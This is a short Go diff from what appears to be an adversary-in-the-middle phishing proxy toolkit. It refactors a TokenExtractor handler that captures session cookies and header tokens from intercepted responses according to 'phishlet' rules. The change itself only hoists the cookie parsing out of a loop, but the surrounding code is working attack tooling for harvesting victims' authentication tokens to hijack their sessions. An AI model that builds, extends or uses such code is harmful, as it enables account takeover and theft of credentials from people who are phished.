@@ -39,11 +39,12 @@ func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 	if ctx.Phishlet == nil || ctx.Session == nil {
 		return nil
 	}
+	cookies := resp.Cookies()
 	updated := false
 	for _, rule := range ctx.Phishlet.AuthTokens {
 		switch rule.Type {
 		case aitm.TokenTypeCookie:
-			updated = h.extractCookieToken(ctx, resp, rule) || updated
+			updated = h.extractCookieToken(ctx, cookies, rule) || updated
 		case aitm.TokenTypeHTTPHeader:
 			updated = h.extractHeaderToken(ctx, resp, rule) || updated
 		}
@@ -63,9 +64,9 @@ func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 	return nil
 }
 
-func (h *TokenExtractor) extractCookieToken(ctx *aitm.ProxyContext, resp *http.Response, rule aitm.TokenRule) bool {
+func (h *TokenExtractor) extractCookieToken(ctx *aitm.ProxyContext, cookies []*http.Cookie, rule aitm.TokenRule) bool {
 	updated := false
-	for _, cookie := range resp.Cookies() {
+	for _, cookie := range cookies {
 		if rule.Name != nil && !rule.Name.MatchString(cookie.Name) {
 			continue
 		}
